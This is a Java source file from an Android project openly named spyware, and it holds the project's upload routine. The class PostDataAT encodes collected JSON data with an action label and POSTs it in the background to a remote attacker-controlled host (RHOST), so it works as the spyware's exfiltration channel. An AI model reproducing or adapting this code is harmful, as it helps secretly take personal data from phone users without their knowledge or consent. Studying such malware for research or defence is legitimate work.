package android.spyware.utils;

import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.RHOST;
import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class PostDataAT extends AsyncTask<Parameter, Void, Integer> {
    @Override
    protected Integer doInBackground(Parameter... params) {
        HttpURLConnection conn = null;

        try {
            String action = params[0].getAction();
            String data;

            if (params[0].isJSONArray()) { data = params[0].getJArray().toString(); } else {
                data = params[0].getJObject().toString();
            }

            URL url = new URL(RHOST);
            String request = new Uri.Builder()
                    .appendQueryParameter("action", action)
                    .appendQueryParameter("data", data)
                    .build().getEncodedQuery();

            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);

            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
            conn.setFixedLengthStreamingMode(request.getBytes().length);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());
            out.writeBytes(request);
            out.flush();

            if (DEV_MODE) {
                Log.d(TAG, PostDataAT.class.getName() + "->doInBackground:" + data);
                Log.d(TAG, PostDataAT.class.getName() + "->doInBackground:" + String.valueOf(conn.getResponseCode()));
            }

            return (conn.getResponseCode());
        } catch (IOException ex) {
            if (DEV_MODE) { Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(ex)); }
        } finally {
            if (conn != null) { conn.disconnect(); }
        }

        return null;
    }

    protected int onPostExecute(int responseCode) {
        return responseCode;
    }
}